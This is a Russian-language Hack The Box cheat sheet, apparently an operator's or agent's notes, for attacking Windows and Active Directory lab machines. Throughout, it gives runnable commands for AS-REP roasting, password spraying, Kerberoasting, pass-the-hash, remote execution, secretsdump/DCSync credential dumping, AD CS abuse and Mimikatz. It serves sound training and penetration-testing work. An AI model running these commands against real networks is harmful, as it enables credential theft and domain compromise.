# HTB: Windows и Active Directory

## Стартовая разведка домена

```bash
nxc smb $DC                      # имя, домен, версия, signing
nxc smb $DC --rid-brute          # юзеры без учётки, если разрешено
enum4linux-ng -A $DC
kerbrute userenum --dc $DC -d domain.local users.txt
```

Домен, имя DC и его время записывать в память задачи: Kerberos чувствителен к расхождению часов больше 5 минут.

## Без пароля: что обычно даёт первые креды

```bash
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip $DC -format hashcat -outputfile asrep.txt   # AS-REP roasting
# парольный спрей одним паролем по списку (аккуратно с политикой блокировок: nxc smb $DC --pass-pol)
nxc smb $DC -u users.txt -p 'Password123!' --continue-on-success
```

Responder в односегментных лабах HTB обычно не нужен (нет чужих машин, которые будут резолвить имена) — не запускать «на всякий случай» на tun0 без причины.

## С кредами: карта impacket и netexec

```bash
nxc smb $DC -u user -p pass --shares --users --groups --pass-pol
nxc smb $TARGETS -u user -H <NTLM> --sam        # по хэшу тоже умеет
impacket-GetUserSPNs domain.local/user:pass -dc-ip $DC -request -outputfile kerberoast.txt
evil-winrm -i $TARGET -u user -p pass            # или -H <NTLM>
impacket-psexec domain.local/user:pass@$TARGET   # нужен локальный админ; smbexec/wmiexec тише
impacket-mssqlclient domain.local/user:pass@$TARGET -windows-auth   # дальше enable_xp_cmdshell
impacket-secretsdump domain.local/user:pass@$TARGET                 # SAM/LSA локально
impacket-secretsdump -just-dc domain.local/user:pass@$DC            # DCSync, нужны права репликации
bloodhound-python -d domain.local -u user -p pass -ns $DC -c All    # zip смотреть в BloodHound на хосте
```

Тикеты: `impacket-getTGT domain.local/user:pass -dc-ip $DC`, дальше `export KRB5CCNAME=user.ccache` и инструменты impacket с `-k -no-pass`.

## AD CS, ACL и делегации (medium-hard)

```bash
certipy-ad find -u user@domain.local -p pass -dc-ip $DC -stdout     # уязвимые шаблоны ESC1-ESC8 (бинарь в Kali — certipy-ad)
```

Дальше по найденному ESC: карта сценариев и ключевые шаги — htb-09-ad-playbooks (раздел AD CS), детали по редким шаблонам — HackTricks AD. ACL-атаки (GenericWrite/WriteOwner и т.п.) смотреть по BloodHound-графу: путь Owned → ... → Domain Admins подсказывает следующий объект, а перевод каждого ребра в конкретную команду bloodyAD — там же, в htb-09 (таблица «Ребро BloodHound → команда», делегирование, релеинг, билеты).

## Kerberos и время в Docker

Часы контейнера — часы хоста, DC в лабе может жить в другом времени. Симптом: `KRB_AP_ERR_SKEW`. Узнать время DC: `nxc smb $DC` печатает время в выводе (или `curl -sI http://$DC`). Лечить обёрткой:

```bash
faketime "2026-01-01 12:00:00" impacket-GetUserSPNs ...
```

Дату брать со слов DC, а не из головы.

## Windows-машина без домена

- Креды часто из веба/SMB-шар (`smbmap -R`, искать *.xml, *.ini, *.txt, KeePass-базы).
- Локальная энумерация: winPEAS из `/opt/tools/windows`, `whoami /priv`, службы и автозапуск (см. htb-05-privesc).
- Mimikatz бинари лежат после установки пакета: `dpkg -L mimikatz | grep exe` (путь проверить в контейнере, раздавать как файл, у нас не запускается).
- Хэши из SAM/LSA и кэша: форматы и режимы hashcat — htb-06-passwords.

## Гигиена

- Каждую учётку записывать со всеми формами: пароль, NTLM, где работает (SMB/WinRM/MSSQL/RDP), где найдена.
- Pass-the-hash работает не везде одинаково: `nxc` показывает `Pwn3d!` только при локальном админе — это и есть сигнал к psexec/secretsdump.
